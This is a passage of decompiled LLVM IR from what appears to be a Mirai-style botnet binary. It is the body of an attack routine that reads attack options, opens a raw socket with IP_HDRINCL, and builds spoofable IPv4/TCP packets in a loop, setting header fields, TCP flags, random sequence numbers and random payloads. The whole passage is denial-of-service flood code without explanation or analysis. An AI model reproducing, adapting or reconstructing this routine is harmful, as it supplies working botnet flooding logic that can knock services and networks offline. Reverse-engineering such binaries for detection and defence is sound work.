  %v0_bc7c = load i32, i32* @r5, align 4
  store i32 %v0_bc7c, i32* %r0.global-to-local, align 4
  %v5_bc84 = inttoptr i32 %v0_bc78 to i32*
  %v6_bc84 = call i32 @attack_get_opt_int(i32 %v0_bc7c, i32* %v5_bc84, i32 6, i32 add (i32 ptrtoint (i32* @global_var_10000.35 to i32), i32 -1))
  %v0_bc8c = load i32, i32* @r4, align 4
  store i32 %v0_bc8c, i32* %r1.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.35 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_bc84, i32* %fp.global-to-local, align 4
  %v0_bc9c = load i32, i32* @r5, align 4
  store i32 %v0_bc9c, i32* %r0.global-to-local, align 4
  %v4_bca0 = inttoptr i32 %v0_bc8c to i32*
  %v5_bca0 = call i32 @attack_get_opt_int(i32 %v0_bc9c, i32* %v4_bca0, i32 7, i32 add (i32 ptrtoint (i32* @global_var_10000.35 to i32), i32 -1))
  %v0_bca8 = load i32, i32* @r4, align 4
  store i32 %v0_bca8, i32* %r1.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.35 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 %v5_bca0, i32* %sb.global-to-local, align 4
  %v0_bcb8 = load i32, i32* @r5, align 4
  store i32 %v0_bcb8, i32* %r0.global-to-local, align 4
  %v4_bcbc = inttoptr i32 %v0_bca8 to i32*
  %v5_bcbc = call i32 @attack_get_opt_int(i32 %v0_bcb8, i32* %v4_bcbc, i32 16, i32 add (i32 ptrtoint (i32* @global_var_10000.35 to i32), i32 -1))
  %v0_bcc8 = load i32, i32* @r4, align 4
  store i32 %v0_bcc8, i32* %r1.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.35 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  %v0_bcd4 = load i32, i32* @r5, align 4
  store i32 %v0_bcd4, i32* %r0.global-to-local, align 4
  %v5_bcd8 = inttoptr i32 %v0_bcc8 to i32*
  %v6_bcd8 = call i32 @attack_get_opt_int(i32 %v0_bcd4, i32* %v5_bcd8, i32 17, i32 add (i32 ptrtoint (i32* @global_var_10000.35 to i32), i32 -1))
  %v0_bcdc = load i32, i32* @r4, align 4
  store i32 %v0_bcdc, i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v0_bce8 = load i32, i32* @sl, align 4
  store i32 %v0_bce8, i32* %r3.global-to-local, align 4
  %v0_bcec = load i32, i32* @r5, align 4
  store i32 %v0_bcec, i32* %r0.global-to-local, align 4
  %v5_bcf0 = inttoptr i32 %v0_bcdc to i32*
  %v6_bcf0 = call i32 @attack_get_opt_int(i32 %v0_bcec, i32* %v5_bcf0, i32 10, i32 %v0_bce8)
  %v0_bcf4 = load i32, i32* @r4, align 4
  store i32 %v0_bcf4, i32* %r1.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_bd04 = load i32, i32* @r5, align 4
  store i32 %v0_bd04, i32* %r0.global-to-local, align 4
  %v5_bd08 = inttoptr i32 %v0_bcf4 to i32*
  %v6_bd08 = call i32 @attack_get_opt_int(i32 %v0_bd04, i32* %v5_bd08, i32 11, i32 1)
  %v0_bd0c = load i32, i32* @r4, align 4
  store i32 %v0_bd0c, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  %v0_bd18 = load i32, i32* @sl, align 4
  store i32 %v0_bd18, i32* %r3.global-to-local, align 4
  %v0_bd1c = load i32, i32* @r5, align 4
  store i32 %v0_bd1c, i32* %r0.global-to-local, align 4
  %v5_bd20 = inttoptr i32 %v0_bd0c to i32*
  %v6_bd20 = call i32 @attack_get_opt_int(i32 %v0_bd1c, i32* %v5_bd20, i32 12, i32 %v0_bd18)
  %v0_bd24 = load i32, i32* @r4, align 4
  store i32 %v0_bd24, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v0_bd30 = load i32, i32* @sl, align 4
  store i32 %v0_bd30, i32* %r3.global-to-local, align 4
  %v0_bd34 = load i32, i32* @r5, align 4
  store i32 %v0_bd34, i32* %r0.global-to-local, align 4
  %v5_bd38 = inttoptr i32 %v0_bd24 to i32*
  %v6_bd38 = call i32 @attack_get_opt_int(i32 %v0_bd34, i32* %v5_bd38, i32 13, i32 %v0_bd30)
  %v0_bd3c = load i32, i32* @r4, align 4
  store i32 %v0_bd3c, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  %v0_bd48 = load i32, i32* @sl, align 4
  store i32 %v0_bd48, i32* %r3.global-to-local, align 4
  %v0_bd4c = load i32, i32* @r5, align 4
  store i32 %v0_bd4c, i32* %r0.global-to-local, align 4
  %v5_bd50 = inttoptr i32 %v0_bd3c to i32*
  %v6_bd50 = call i32 @attack_get_opt_int(i32 %v0_bd4c, i32* %v5_bd50, i32 14, i32 %v0_bd48)
  %v0_bd54 = load i32, i32* @r4, align 4
  store i32 %v0_bd54, i32* %r1.global-to-local, align 4
  %v0_bd5c = load i32, i32* @sl, align 4
  store i32 %v0_bd5c, i32* %r3.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v0_bd64 = load i32, i32* @r5, align 4
  store i32 %v0_bd64, i32* %r0.global-to-local, align 4
  %v5_bd68 = inttoptr i32 %v0_bd54 to i32*
  %v6_bd68 = call i32 @attack_get_opt_int(i32 %v0_bd64, i32* %v5_bd68, i32 15, i32 %v0_bd5c)
  %v0_bd6c = load i32, i32* @r4, align 4
  store i32 %v0_bd6c, i32* %r1.global-to-local, align 4
  %v0_bd74 = load i32, i32* @sl, align 4
  store i32 %v0_bd74, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  %v0_bd7c = load i32, i32* @r5, align 4
  store i32 %v0_bd7c, i32* %r0.global-to-local, align 4
  %v5_bd80 = inttoptr i32 %v0_bd6c to i32*
  %v6_bd80 = call i32 @attack_get_opt_int(i32 %v0_bd7c, i32* %v5_bd80, i32 %v0_bd74, i32 512)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_bd8c = load i32, i32* @r4, align 4
  store i32 %v0_bd8c, i32* %r1.global-to-local, align 4
  store i32 %v6_bd80, i32* @r8, align 4
  %v0_bd94 = load i32, i32* @r5, align 4
  store i32 %v0_bd94, i32* %r0.global-to-local, align 4
  %v4_bd98 = inttoptr i32 %v0_bd8c to i32*
  %v5_bd98 = call i32 @attack_get_opt_int(i32 %v0_bd94, i32* %v4_bd98, i32 1, i32 1)
  %v2_bda4 = load i32, i32* @global_var_2610c.91, align 4
  store i32 %v2_bda4, i32* %r3.global-to-local, align 4
  %v1_bda8 = urem i32 %v5_bd98, 256
  store i32 %v1_bda8, i32* %ip.global-to-local, align 4
  %v0_bdac = load i32, i32* @r4, align 4
  store i32 %v0_bdac, i32* %r1.global-to-local, align 4
  store i32 24, i32* %r2.global-to-local, align 4
  %v0_bdb4 = load i32, i32* @r5, align 4
  store i32 %v0_bdb4, i32* %r0.global-to-local, align 4
  %v5_bdbc = inttoptr i32 %v0_bdac to i32*
  %v6_bdbc = call i32 @attack_get_opt_ip(i32 %v0_bdb4, i32* %v5_bdbc, i32 24, i32 %v2_bda4, i32 %v1_bda8)
  %v0_bdc4 = load i32, i32* @sl, align 4
  store i32 %v0_bdc4, i32* %r0.global-to-local, align 4
  %v1_bdc8 = inttoptr i32 %v0_bdc4 to i32*
  %v2_bdc8 = call i32 @__GI_time(i32* %v1_bdc8)
  %v1_bdcc = load i32, i32* @r6, align 4
  %v2_bdcc = add i32 %v1_bdcc, %v2_bdc8
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v3_bde0 = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_bde0, i32* %r0.global-to-local, align 4
  %v7_bde4 = icmp eq i32 %v3_bde0, -1
  store i1 %v7_bde4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_bde4, label %dec_label_pc_c2c8, label %dec_label_pc_bdf0

dec_label_pc_bdf0:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_bdf8 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_bdf8, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  %v0_be00 = load i32, i32* @sl, align 4
  store i32 %v0_be00, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_be0c = call i32 @__GI_setsockopt(i32 %v3_bde0, i32 %v0_be00, i32 3, i32 %v6_bdf8, i32 4)
  store i32 %v5_be0c, i32* %r0.global-to-local, align 4
  %v7_be10 = icmp eq i32 %v5_be0c, -1
  store i1 %v7_be10, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_be10, label %dec_label_pc_c2d4, label %dec_label_pc_be18

dec_label_pc_be18:                                ; preds = %dec_label_pc_bdf0
  store i32 %v7_bc28, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %v0_be24 = load i32, i32* %fp.global-to-local, align 4
  %v0_be28 = load i32, i32* %sb.global-to-local, align 4
  %v3_be28 = mul i32 %v0_be28, 65536
  store i32 %v3_be28, i32* %sb.global-to-local, align 4
  %v3_be2c = urem i32 %v7_bc28, 65536
  store i32 %v3_be2c, i32* %r2.global-to-local, align 4
  %v3_be30 = urem i32 %v0_be24, 65536
  store i32 %v3_be30, i32* %r3.global-to-local, align 4
  %v3_be34 = urem i32 %v0_be28, 65536
  store i32 %v3_be34, i32* %ip.global-to-local, align 4
  %v2_be38 = icmp eq i32 %arg2, 0
  store i1 %v2_be38, i1* %cpsr_z.global-to-local, align 1
  %v0_be3c = load i32, i32* @sl, align 4
  store i32 %v0_be3c, i32* %stack_var_-44, align 4
  br i1 %v2_be38, label %dec_label_pc_c078.preheader, label %dec_label_pc_be50

dec_label_pc_be50:                                ; preds = %dec_label_pc_be18
  %v0_be60 = load i32, i32* @r8, align 4
  %v3_be60 = mul i32 %v0_be60, 65536
  %v1_be68 = add i32 %v3_be60, 2621440
  %tmp59 = mul i32 %v0_be24, 256
  %v3_be74 = and i32 %tmp59, 65280
  %tmp60 = mul i32 %v0_be28, 256
  %v3_be78 = and i32 %tmp60, 65280
  %tmp61 = udiv i32 %v0_be24, 256
  %v4_be80 = urem i32 %tmp61, 256
  %v5_be80 = or i32 %v4_be80, %v3_be74
  %tmp62 = udiv i32 %v1_be68, 256
  %v3_be84 = and i32 %tmp62, 65280
  %tmp63 = mul i32 %v7_bc28, 256
  %v3_be88 = and i32 %tmp63, 65280
  %tmp64 = udiv i32 %v0_be28, 256
  %v4_be8c = urem i32 %tmp64, 256
  %v5_be8c = or i32 %v4_be8c, %v3_be78
  store i32 %v5_be8c, i32* @fp, align 4
  %v4_be9c = udiv i32 %v1_be68, 16777216
  %v5_be9c = or i32 %v3_be84, %v4_be9c
  store i32 %v5_be9c, i32* @lr, align 4
  %tmp65 = udiv i32 %v7_bc28, 256
  %v4_bea0 = urem i32 %tmp65, 256
  %v5_bea0 = or i32 %v4_bea0, %v3_be88
  store i32 %v5_bea0, i32* @r5, align 4
  %tmp66 = mul i32 %v5_bcbc, 256
  %v3_beac = and i32 %tmp66, 65280
  %v1_beb0 = urem i32 %v6_bcf0, 2
  %v1_beb4 = urem i32 %v6_bd08, 2
  %tmp67 = udiv i32 %v5_bcbc, 256
  %v4_beb8 = urem i32 %tmp67, 256
  %v5_beb8 = or i32 %v4_beb8, %v3_beac
  %v1_bec4 = urem i32 %v6_bd20, 2
  store i32 %v1_bec4, i32* %r2.global-to-local, align 4
  %v1_bec8 = urem i32 %v6_bd38, 2
  store i32 %v1_bec8, i32* %r3.global-to-local, align 4
  store i32 %v6_bd50, i32* %ip.global-to-local, align 4
  store i32 %v6_bd68, i32* %r0.global-to-local, align 4
  store i32 %v6_bd20, i32* %r1.global-to-local, align 4
  %v1_bef0 = urem i32 %v6_bd50, 2
  store i32 %v1_bef0, i32* @sb, align 4
  store i32 %v0_be3c, i32* @r4, align 4
  %v1_bef8 = urem i32 %v6_bd20, 256
  store i32 %v1_bef8, i32* @r6, align 4
  %v1_befc = urem i32 %v6_bd68, 2
  store i32 %v1_befc, i32* @sl, align 4
  %v4_bf54 = sext i8 %v5_bc24 to i32
  %sext6 = mul nuw i32 %v5_be9c, 65536
  %v4_bf70 = sdiv i32 %sext6, 65536
  %sext7 = mul nuw i32 %v5_bea0, 65536
  %v4_bf78 = sdiv i32 %sext7, 65536
  %sext8 = mul nuw i32 %v5_be80, 65536
  %v4_bf94 = sdiv i32 %sext8, 65536
  %tmp = sub nsw i32 0, %v1_beb4
  %v4_bfe4 = and i32 %tmp, 16
  %tmp70 = sub nsw i32 0, %v1_bec4
  %v4_bff8 = and i32 %tmp70, 8
  %tmp71 = sub nsw i32 0, %v1_bec8
  %v4_c00c = and i32 %tmp71, 4
  %v1_bf64 = trunc i32 %v6_bc40 to i8
  br label %dec_label_pc_bf00

dec_label_pc_bf00:                                ; preds = %.thread10, %dec_label_pc_be50
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_bf0c = call i32 @calloc(i32 1510, i32 1)
  %v2_bf14 = load i32, i32* @r4, align 4
  %v5_bf14 = mul i32 %v2_bf14, 4
  %v6_bf14 = add i32 %v5_bf14, %v2_bbec
  %v7_bf14 = inttoptr i32 %v6_bf14 to i32*
  store i32 %v2_bf0c, i32* %v7_bf14, align 4
  %v3_bf18 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_bf18, i32* %r2.global-to-local, align 4
  %v5_bf20 = mul i32 %v3_bf18, 24
  %v1_bf24 = load i32, i32* @r7, align 4
  %v2_bf24 = add i32 %v1_bf24, %v5_bf20
  store i32 %v2_bf24, i32* %r0.global-to-local, align 4
  store i32 %v2_bbec, i32* %r3.global-to-local, align 4
  %v4_bf2c = mul i32 %v3_bf18, 4
  %v5_bf2c = add i32 %v4_bf2c, %v2_bbec
  %v6_bf2c = inttoptr i32 %v5_bf2c to i32*
  %v7_bf2c = load i32, i32* %v6_bf2c, align 4
  store i32 %v7_bf2c, i32* %r1.global-to-local, align 4
  %v1_bf30 = inttoptr i32 %v7_bf2c to i8*
  %v2_bf30 = load i8, i8* %v1_bf30, align 1
  %tmp72 = urem i8 %v2_bf30, 16
  %v1_bf34 = zext i8 %tmp72 to i32
  %v1_bf38 = or i32 %v1_bf34, 64
  store i32 %v1_bf38, i32* %r3.global-to-local, align 4
  %v1_bf3c = trunc i32 %v1_bf38 to i8
  store i8 %v1_bf3c, i8* %v1_bf30, align 1
  %v0_bf40 = load i32, i32* %r1.global-to-local, align 4
  %v1_bf40 = inttoptr i32 %v0_bf40 to i8*
  %v2_bf40 = load i8, i8* %v1_bf40, align 1
  %v1_bf44 = and i8 %v2_bf40, -16
  %v1_bf48 = or i8 %v1_bf44, 5
  store i32 %v1_bc6c, i32* %ip.global-to-local, align 4
  store i8 %v1_bf48, i8* %v1_bf40, align 1
  store i32 %v4_bf54, i32* %r2.global-to-local, align 4
  %v2_bf58 = load i32, i32* %r1.global-to-local, align 4
  %v3_bf58 = add i32 %v2_bf58, 1
  %v4_bf58 = inttoptr i32 %v3_bf58 to i8*
  store i8 %v5_bc24, i8* %v4_bf58, align 1
  store i32 %v1_bc48, i32* %r3.global-to-local, align 4
  %v0_bf60 = load i32, i32* %ip.global-to-local, align 4
  %v2_bf60 = icmp eq i32 %v0_bf60, 0
  store i1 %v2_bf60, i1* %cpsr_z.global-to-local, align 1
  %v2_bf64 = load i32, i32* %r1.global-to-local, align 4
  %v3_bf64 = add i32 %v2_bf64, 8
  %v4_bf64 = inttoptr i32 %v3_bf64 to i8*
  store i8 %v1_bf64, i8* %v4_bf64, align 1
  %v0_bf68 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_bf68, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_bf00
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_bf6c = load i32, i32* %r1.global-to-local, align 4
  %v4_bf6c = add i32 %v3_bf6c, 6
  %v5_bf6c = inttoptr i32 %v4_bf6c to i16*
  store i16 64, i16* %v5_bf6c, align 2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_bf00, %bb
  store i32 %v4_bf70, i32* %ip.global-to-local, align 4
  store i32 6, i32* %r3.global-to-local, align 4
  store i32 %v4_bf78, i32* %r2.global-to-local, align 4
  %v2_bf7c = load i32, i32* %r1.global-to-local, align 4
  %v3_bf7c = add i32 %v2_bf7c, 9
  %v4_bf7c = inttoptr i32 %v3_bf7c to i8*
  store i8 6, i8* %v4_bf7c, align 1
  %v0_bf80 = load i32, i32* %ip.global-to-local, align 4
  %v1_bf80 = trunc i32 %v0_bf80 to i16
  %v2_bf80 = load i32, i32* %r1.global-to-local, align 4
  %v3_bf80 = add i32 %v2_bf80, 2
  %v4_bf80 = inttoptr i32 %v3_bf80 to i16*
  store i16 %v1_bf80, i16* %v4_bf80, align 2
  store i32 %v6_bdbc, i32* %ip.global-to-local, align 4
  %v1_bf88 = load i32, i32* %r1.global-to-local, align 4
  %v2_bf88 = add i32 %v1_bf88, 12
  %v3_bf88 = inttoptr i32 %v2_bf88 to i32*
  store i32 %v6_bdbc, i32* %v3_bf88, align 4
  %v0_bf8c = load i32, i32* %r2.global-to-local, align 4
  %v1_bf8c = trunc i32 %v0_bf8c to i16
  %v2_bf8c = load i32, i32* %r1.global-to-local, align 4
  %v3_bf8c = add i32 %v2_bf8c, 4
  %v4_bf8c = inttoptr i32 %v3_bf8c to i16*
  store i16 %v1_bf8c, i16* %v4_bf8c, align 2
  %v0_bf90 = load i32, i32* %r0.global-to-local, align 4
  %v1_bf90 = add i32 %v0_bf90, 16
  %v2_bf90 = inttoptr i32 %v1_bf90 to i32*
  %v3_bf90 = load i32, i32* %v2_bf90, align 4
  store i32 %v3_bf90, i32* %r2.global-to-local, align 4
  store i32 %v4_bf94, i32* %r0.global-to-local, align 4
  %v1_bf98 = load i32, i32* %r1.global-to-local, align 4
  %v2_bf98 = add i32 %v1_bf98, 16
  %v3_bf98 = inttoptr i32 %v2_bf98 to i32*
  store i32 %v3_bf90, i32* %v3_bf98, align 4
  %v0_bf9c = load i32, i32* %r0.global-to-local, align 4
  %v1_bf9c = trunc i32 %v0_bf9c to i16
  %v2_bf9c = load i32, i32* %r1.global-to-local, align 4
  %v3_bf9c = add i32 %v2_bf9c, 20
  %v4_bf9c = inttoptr i32 %v3_bf9c to i16*
  store i16 %v1_bf9c, i16* %v4_bf9c, align 2
  %v0_bfa0 = load i32, i32* %r1.global-to-local, align 4
  %v1_bfa0 = add i32 %v0_bfa0, 20
  store i32 %v1_bfa0, i32* @r4, align 4
  %v1_bfa4 = add i32 %v0_bfa0, 32
  %v2_bfa4 = inttoptr i32 %v1_bfa4 to i8*
  %v3_bfa4 = load i8, i8* %v2_bfa4, align 1
  %v4_bfa4 = zext i8 %v3_bfa4 to i32
  %v1_bfa8 = and i32 %v4_bfa4, 95
  store i32 %v1_bfa8, i32* %r3.global-to-local, align 4
  %v1_bfac = add i32 %v0_bfa0, 33
  %v2_bfac = inttoptr i32 %v1_bfac to i8*
  %v3_bfac = load i8, i8* %v2_bfac, align 1
  %v4_bfac = zext i8 %v3_bfac to i32
  store i32 %v4_bfac, i32* %r2.global-to-local, align 4
  %v1_bfb0 = or i32 %v1_bfa8, 80
  %v1_bfb4 = add i32 %v0_bfa0, 40
  store i32 %v1_bfb4, i32* @r5, align 4
  store i32 %v1_beb0, i32* %r1.global-to-local, align 4
  %v1_bfbc = trunc i32 %v1_bfb0 to i8
  store i8 %v1_bfbc, i8* %v2_bfa4, align 1
  store i32 %v5_beb8, i32* %r3.global-to-local, align 4
  %v0_bfc4 = load i32, i32* %r2.global-to-local, align 4
  %v1_bfc4 = and i32 %v0_bfc4, -33
  %v1_bfc8 = load i32, i32* %r1.global-to-local, align 4
  %v4_bfc8 = mul i32 %v1_bfc8, 32
  %v5_bfc8 = or i32 %v4_bfc8, %v1_bfc4
  store i32 %v5_bfc8, i32* %r2.global-to-local, align 4
  %v1_bfcc = load i32, i32* @r4, align 4
  %v2_bfcc = add i32 %v1_bfcc, 4
  %v3_bfcc = inttoptr i32 %v2_bfcc to i32*
  store i32 %v5_beb8, i32* %v3_bfcc, align 4
  %v0_bfd0 = load i32, i32* @fp, align 4
  %v1_bfd0 = trunc i32 %v0_bfd0 to i16
  %v2_bfd0 = load i32, i32* @r4, align 4
  %v3_bfd0 = add i32 %v2_bfd0, 2
  %v4_bfd0 = inttoptr i32 %v3_bfd0 to i16*
  store i16 %v1_bfd0, i16* %v4_bfd0, align 2
  %v0_bfd4 = load i32, i32* %r2.global-to-local, align 4
  %v1_bfd4 = trunc i32 %v0_bfd4 to i8
  %v2_bfd4 = load i32, i32* @r4, align 4
  %v3_bfd4 = add i32 %v2_bfd4, 13
  %v4_bfd4 = inttoptr i32 %v3_bfd4 to i8*
  store i8 %v1_bfd4, i8* %v4_bfd4, align 1
  %v0_bfd8 = load i32, i32* @r4, align 4
  %v1_bfd8 = add i32 %v0_bfd8, 13
  %v2_bfd8 = inttoptr i32 %v1_bfd8 to i8*
  %v3_bfd8 = load i8, i8* %v2_bfd8, align 1
  %v4_bfd8 = zext i8 %v3_bfd8 to i32
  store i32 %v1_beb4, i32* %ip.global-to-local, align 4
  %v1_bfe0 = and i32 %v4_bfd8, 239
  %v5_bfe4 = or i32 %v1_bfe0, %v4_bfe4
  store i32 %v5_bfe4, i32* %r3.global-to-local, align 4
  %v1_bfe8 = trunc i32 %v5_bfe4 to i8
  store i8 %v1_bfe8, i8* %v2_bfd8, align 1
  %v0_bfec = load i32, i32* @r4, align 4
  %v1_bfec = add i32 %v0_bfec, 13
  %v2_bfec = inttoptr i32 %v1_bfec to i8*
  %v3_bfec = load i8, i8* %v2_bfec, align 1
  %v4_bfec = zext i8 %v3_bfec to i32
  store i32 %v1_bec4, i32* %r0.global-to-local, align 4
  %v1_bff4 = and i32 %v4_bfec, 247
  %v5_bff8 = or i32 %v1_bff4, %v4_bff8
  store i32 %v5_bff8, i32* %r2.global-to-local, align 4
  %v1_bffc = trunc i32 %v5_bff8 to i8
  store i8 %v1_bffc, i8* %v2_bfec, align 1
  %v0_c000 = load i32, i32* @r4, align 4
  %v1_c000 = add i32 %v0_c000, 13
  %v2_c000 = inttoptr i32 %v1_c000 to i8*
  %v3_c000 = load i8, i8* %v2_c000, align 1
  %v4_c000 = zext i8 %v3_c000 to i32
  store i32 %v1_bec8, i32* %r1.global-to-local, align 4
  %v1_c008 = and i32 %v4_c000, 251
  %v5_c00c = or i32 %v1_c008, %v4_c00c
  store i32 %v5_c00c, i32* %r3.global-to-local, align 4
  %v1_c010 = trunc i32 %v5_c00c to i8
  store i8 %v1_c010, i8* %v2_c000, align 1
  %v0_c014 = load i32, i32* @r4, align 4
  %v1_c014 = add i32 %v0_c014, 13
  %v2_c014 = inttoptr i32 %v1_c014 to i8*
  %v3_c014 = load i8, i8* %v2_c014, align 1
  %v4_c014 = zext i8 %v3_c014 to i32
  %v1_c018 = and i32 %v4_c014, 253
  %v1_c01c = load i32, i32* @sb, align 4
  %v3_c01c = mul i32 %v1_c01c, 2
  %v4_c01c = or i32 %v3_c01c, %v1_c018
  store i32 %v4_c01c, i32* %r2.global-to-local, align 4
  %v1_c020 = trunc i32 %v4_c01c to i8
  store i8 %v1_c020, i8* %v2_c014, align 1
  %v0_c024 = load i32, i32* @r4, align 4
  %v1_c024 = add i32 %v0_c024, 13
  %v2_c024 = inttoptr i32 %v1_c024 to i8*
  %v3_c024 = load i8, i8* %v2_c024, align 1
  %v4_c024 = zext i8 %v3_c024 to i32
  %v1_c028 = and i32 %v4_c024, 254
  %v0_c02c = load i32, i32* @sl, align 4
  %v2_c02c = or i32 %v1_c028, %v0_c02c
  store i32 %v2_c02c, i32* %r3.global-to-local, align 4
  %v1_c030 = trunc i32 %v2_c02c to i8
  store i8 %v1_c030, i8* %v2_c024, align 1
  %v0_c034 = call i32 @rand_next()
  %v1_c034 = trunc i32 %v0_c034 to i16
  store i32 %v0_c034, i32* %r0.global-to-local, align 4
  %v0_c038 = load i32, i32* @r6, align 4
  %v2_c038 = icmp eq i32 %v0_c038, 0
  store i1 %v2_c038, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_c038, label %.thread10, label %bb68

bb68:                                             ; preds = %.thread
  %v1_c03c = load i32, i32* @r4, align 4
  %v2_c03c = add i32 %v1_c03c, 13
  %v3_c03c = inttoptr i32 %v2_c03c to i8*
  %v4_c03c = load i8, i8* %v3_c03c, align 1
  %v5_c03c = zext i8 %v4_c03c to i32
  %v2_c040 = or i32 %v5_c03c, 8
  store i32 %v2_c040, i32* %r3.global-to-local, align 4
  %v2_c044 = trunc i32 %v2_c040 to i8
  store i8 %v2_c044, i8* %v3_c03c, align 1
  br label %.thread10

.thread10:                                        ; preds = %.thread, %bb68
  %v3_c048 = load i32, i32* @r4, align 4
  %v4_c048 = add i32 %v3_c048, 14
  %v5_c048 = inttoptr i32 %v4_c048 to i16*
  store i16 %v1_c034, i16* %v5_c048, align 2
  %v0_c04c = load i32, i32* @r8, align 4
  store i32 %v0_c04c, i32* %r1.global-to-local, align 4
  %v0_c050 = load i32, i32* @r5, align 4
  store i32 %v0_c050, i32* %r0.global-to-local, align 4
  %v2_c054 = call i32 @rand_alphastr(i32 %v0_c050, i32 %v0_c04c)
  store i32 %v2_c054, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_c05c = load i32, i32* @r5, align 4
  %v3_c05c = load i32, i32* @r8, align 4
  %v4_c05c = add i32 %v3_c05c, %v2_c05c
  %v5_c05c = inttoptr i32 %v4_c05c to i8*
  store i8 0, i8* %v5_c05c, align 1
  %v3_c060 = load i32, i32* %stack_var_-44, align 4
  %v1_c064 = add i32 %v3_c060, 1
  store i32 %v1_c064, i32* @r4, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v9_c06c = icmp eq i32 %v1_c064, %arg2
  store i1 %v9_c06c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_c064, i32* %stack_var_-44, align 4
  %v5_c074 = icmp slt i32 %v1_c064, %arg2
  br i1 %v5_c074, label %dec_label_pc_bf00, label %dec_label_pc_c078.preheader

dec_label_pc_c078.preheader:                      ; preds = %.thread10, %dec_label_pc_be18
  %v2_c0b4 = icmp eq i32 %v6_bdbc, -1
  %v7_c0b4 = icmp eq i32 %v6_bdbc, -1
  %v9_c228 = icmp eq i32 %v3_be2c, add (i32 ptrtoint (i32* @global_var_10000.35 to i32), i32 -1)
  %v2_c28c = icmp eq i32 %v1_bda8, 0
  br label %dec_label_pc_c078

dec_label_pc_c078:                                ; preds = %dec_label_pc_c078.preheader, %dec_label_pc_c2b4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i1 %v2_be38, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_be38, label %dec_label_pc_c2b4, label %dec_label_pc_c08c

dec_label_pc_c08c:                                ; preds = %dec_label_pc_c078
  %v0_c08c = load i32, i32* @r8, align 4
  %v3_c08c = mul i32 %v0_c08c, 65536
  %v1_c090 = add i32 %v3_c08c, 1310720
  store i32 %v1_c090, i32* %r2.global-to-local, align 4
  %tmp69 = udiv i32 %v1_c090, 256
  %v3_c098 = and i32 %tmp69, 65280
  store i32 %v3_c098, i32* %r3.global-to-local, align 4
  %v4_c09c = udiv i32 %v1_c090, 16777216
  %v5_c09c = or i32 %v3_c098, %v4_c09c
  store i32 %v5_c09c, i32* @fp, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_c0a4 = add i32 %v0_c08c, 20
  store i32 %v1_c0a4, i32* @sb, align 4
  %v1_c0a8 = add i32 %v0_c08c, 40
  store i32 %v1_c0a8, i32* @sl, align 4
  br label %dec_label_pc_c194

dec_label_pc_c0b0:                                ; preds = %dec_label_pc_c194
  store i32 %v6_bdbc, i32* %r0.global-to-local, align 4
  store i1 %v7_c0b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_c0b4, label %dec_label_pc_c218, label %dec_label_pc_c0bc

dec_label_pc_c0bc:                                ; preds = %dec_label_pc_c1b8, %dec_label_pc_c0b0
  store i32 %v3_be2c, i32* %r1.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.35 to i32), i32 -1), i32* @r4, align 4
  store i1 %v9_c228, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c228, label %dec_label_pc_c234, label %dec_label_pc_c0d0

dec_label_pc_c0d0:                                ; preds = %dec_label_pc_c218.dec_label_pc_c0d0_crit_edge, %dec_label_pc_c0bc
  %v1_c0d4 = phi i32 [ %v1_c0d4.pre, %dec_label_pc_c218.dec_label_pc_c0d0_crit_edge ], [ add (i32 ptrtoint (i32* @global_var_10000.35 to i32), i32 -1), %dec_label_pc_c0bc ]
  store i32 %v3_be30, i32* %r2.global-to-local, align 4
  %v9_c0d4 = icmp eq i32 %v3_be30, %v1_c0d4
  store i1 %v9_c0d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c0d4, label %dec_label_pc_c248, label %dec_label_pc_c0dc

